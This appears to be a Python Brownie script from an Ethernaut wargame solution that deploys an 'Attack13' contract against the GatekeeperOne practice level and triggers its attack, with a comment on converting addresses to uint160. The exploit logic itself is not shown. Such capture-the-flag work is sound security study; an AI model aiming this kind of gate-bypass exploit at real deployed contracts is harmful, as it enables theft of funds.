from scripts.helpful_scripts import get_account
from brownie import web3, interface, Attack13


ETHERNAUT_INSTANCE = "0x52D9172066F788070Ca1F74A26F3aD2902282c37"
GAS_LIMIT = 6000000
GAS = 8191


def main():

    player = get_account()
    attack = Attack13.deploy(ETHERNAUT_INSTANCE, {"from": player})
    target = interface.IGatekeeperOne(ETHERNAUT_INSTANCE)

    attack.attack()

    # check that we've won by confirming that 'entrant' = player


# uint160 is the shortest unsigned integer which can hold 20 bytes of information
# that Ethereum addresses are 20 bytes in hexadecimal format.
# So you can convert an Ethereum address directly into uint160 and back.
